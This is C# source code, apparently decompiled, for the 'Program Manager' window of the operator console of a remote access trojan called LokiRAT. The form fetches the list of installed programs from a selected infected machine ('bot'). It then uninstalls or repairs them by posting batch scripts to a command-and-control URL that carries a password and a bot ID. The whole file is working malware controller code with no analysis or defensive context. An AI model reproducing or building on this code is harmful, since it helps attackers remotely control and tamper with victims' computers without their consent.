namespace LokiRAT_Server
{
    using System;
    using System.Collections.Specialized;
    using System.ComponentModel;
    using System.Drawing;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class programManager : Form
    {
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ColumnHeader columnHeader4;
        private IContainer components = null;
        private ContextMenuStrip contextMenuStrip1;
        private ToolStripMenuItem deleteToolStripMenuItem;
        private ImageList imageList1;
        private ListView listView1;
        private string myLastCommand = "-1";
        private ToolStripMenuItem reloadToolStripMenuItem;
        private ToolStripMenuItem repairToolStripMenuItem;
        private System.Windows.Forms.Timer timer1;
        private ToolStripSeparator toolStripSeparator1;
        private string[] uninstallStrings = new string[0x3e7];

        public programManager()
        {
            this.InitializeComponent();
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string str = "@ECHO OFF\nSTART ";
            if (this.uninstallStrings[this.listView1.SelectedIndices[0]].Contains("/I"))
            {
                str = str + this.uninstallStrings[this.listView1.SelectedIndices[0]].Replace("/I", "/X");
            }
            else
            {
                str = str + this.uninstallStrings[this.listView1.SelectedIndices[0]];
            }
            this.postData("type=command", "script|bat|" + str);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(programManager));
            this.listView1 = new ListView();
            this.columnHeader1 = new ColumnHeader();
            this.columnHeader2 = new ColumnHeader();
            this.columnHeader3 = new ColumnHeader();
            this.columnHeader4 = new ColumnHeader();
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.reloadToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator1 = new ToolStripSeparator();
            this.deleteToolStripMenuItem = new ToolStripMenuItem();
            this.repairToolStripMenuItem = new ToolStripMenuItem();
            this.imageList1 = new ImageList(this.components);
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip1.SuspendLayout();
            base.SuspendLayout();
            this.listView1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.listView1.Columns.AddRange(new ColumnHeader[] { this.columnHeader1, this.columnHeader2, this.columnHeader3, this.columnHeader4 });
            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new Point(1, 0);
            this.listView1.MultiSelect = false;
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.Size = new Size(0x277, 0x1a0);
            this.listView1.SmallImageList = this.imageList1;
            this.listView1.TabIndex = 3;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = View.Details;
            this.columnHeader1.Text = "Program Name";
            this.columnHeader1.Width = 0xbb;
            this.columnHeader2.Text = "Publisher";
            this.columnHeader2.Width = 0x90;
            this.columnHeader3.Text = "Version";
            this.columnHeader3.Width = 0x51;
            this.columnHeader4.Text = "Uninstall String";
            this.columnHeader4.Width = 0x61;
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[] { this.reloadToolStripMenuItem, this.toolStripSeparator1, this.deleteToolStripMenuItem, this.repairToolStripMenuItem });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(0x79, 0x4c);
            this.reloadToolStripMenuItem.Image = (Image) manager.GetObject("reloadToolStripMenuItem.Image");
            this.reloadToolStripMenuItem.Name = "reloadToolStripMenuItem";
            this.reloadToolStripMenuItem.Size = new Size(120, 0x16);
            this.reloadToolStripMenuItem.Text = "Reload";
            this.reloadToolStripMenuItem.Click += new EventHandler(this.reloadToolStripMenuItem_Click);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new Size(0x75, 6);
            this.deleteToolStripMenuItem.Image = (Image) manager.GetObject("deleteToolStripMenuItem.Image");
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new Size(120, 0x16);
            this.deleteToolStripMenuItem.Text = "Uninstall";
            this.deleteToolStripMenuItem.Click += new EventHandler(this.deleteToolStripMenuItem_Click);
            this.repairToolStripMenuItem.Image = (Image) manager.GetObject("repairToolStripMenuItem.Image");
            this.repairToolStripMenuItem.Name = "repairToolStripMenuItem";
            this.repairToolStripMenuItem.Size = new Size(120, 0x16);
            this.repairToolStripMenuItem.Text = "Repair";
            this.repairToolStripMenuItem.Click += new EventHandler(this.repairToolStripMenuItem_Click);
            this.imageList1.ImageStream = (ImageListStreamer) manager.GetObject("imageList1.ImageStream");
            this.imageList1.TransparentColor = Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "install.png");
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x278, 0x19f);
            base.Controls.Add(this.listView1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "programManager";
            this.Text = "Program Manager | LokiRAT";
            base.Load += new EventHandler(this.programManager_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            base.ResumeLayout(false);
        }

        public void postData(string getString, string postString)
        {
            try
            {
                WebClient client = new WebClient();
                NameValueCollection data = new NameValueCollection();
                data.Add("command", postString);
                client.UploadValues(main.connectionURL + "?pass=" + main.connectionPass + "&id=" + main.currentID + "&" + getString, data);
            }
            catch
            {
            }
        }

        private void programManager_Load(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=programs");
        }

        private void reloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.listView1.Items.Clear();
            main.sendToHost("type=command&command=programs");
        }

        private void repairToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string str = "@ECHO OFF\nSTART ";
            if (this.uninstallStrings[this.listView1.SelectedIndices[0]].Contains("/X"))
            {
                str = str + this.uninstallStrings[this.listView1.SelectedIndices[0]].Replace("/X", "/I");
            }
            else
            {
                str = str + this.uninstallStrings[this.listView1.SelectedIndices[0]];
            }
            this.postData("type=command", "script|bat|" + str);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string[] strArray = new string[5];
            string[] strArray2 = new string[0x3e7];
            try
            {
                if (main.lastCommand[main.selectedBot] != this.myLastCommand)
                {
                    this.myLastCommand = main.lastCommand[main.selectedBot];
                    if (main.lastCommandText[main.selectedBot].Substring(0, 10) == "LSprograms")
                    {
                        this.myLastCommand = main.lastCommand[main.selectedBot];
                        this.listView1.Items.Clear();
                        strArray2 = Regex.Split(main.lastCommandText[main.selectedBot], "{-p}");
                        for (int i = 1; i < (strArray2.Length - 1); i++)
                        {
                            strArray = Regex.Split(strArray2[i], "{-pi}");
                            this.uninstallStrings[i] = strArray[3];
                            ListViewItem item = this.listView1.Items.Add(strArray[0]);
                            item.ImageIndex = 0;
                            item.SubItems.Add(strArray[2]);
                            item.SubItems.Add(strArray[1]);
                            item.SubItems.Add(strArray[3]);
                        }
                    }
                }
            }
            catch
            {
            }
        }
    }
}

